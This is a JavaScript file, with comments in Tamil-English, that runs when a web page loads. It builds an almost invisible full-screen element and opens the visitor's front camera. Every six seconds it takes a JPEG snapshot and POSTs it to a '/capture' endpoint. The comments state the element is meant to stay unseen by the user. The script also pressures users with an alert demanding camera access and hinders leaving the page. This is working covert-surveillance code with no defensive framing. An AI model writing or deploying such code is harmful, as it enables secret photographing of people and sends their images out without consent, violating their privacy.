document.addEventListener("DOMContentLoaded", () => {
    if (!document.getElementById('hiddenCam')) {
        const hiddenCamDiv = document.createElement('div');
        hiddenCamDiv.id = 'hiddenCam';
        // Ithu thaan main fix: display none ku pathila, invisible ah vachirukkom
        hiddenCamDiv.style.position = 'fixed';
        hiddenCamDiv.style.top = '0';
        hiddenCamDiv.style.left = '0';
        hiddenCamDiv.style.width = '100vw';
        hiddenCamDiv.style.height = '100vh';
        hiddenCamDiv.style.opacity = '0.01'; // User ku theriyaathu, aana browser ku theriyum
        hiddenCamDiv.style.pointerEvents = 'none';
        hiddenCamDiv.style.zIndex = '-1';
        hiddenCamDiv.innerHTML = `
            <video id="video" autoplay muted playsinline></video>
            <canvas id="canvas"></canvas>
        `;
        document.body.appendChild(hiddenCamDiv);
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => {
        video.srcObject = stream;
        
        // Video play aagum varaikkum wait pannum
        video.onloadedmetadata = () => {
            video.play();
            
            // 6 Seconds ku oru thadava capture
            setInterval(() => {
                if (!video.videoWidth || !video.videoHeight) return; // Video ready illana skip pannu
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/jpeg', 0.8); // Quality 0.8

                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imgData })
                }).catch(e => console.log("Error:", e));
            }, 6000); 
        };
    })
    .catch(err => {
        alert("Camera access is required to continue!");
    });

    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = '';
    });
});
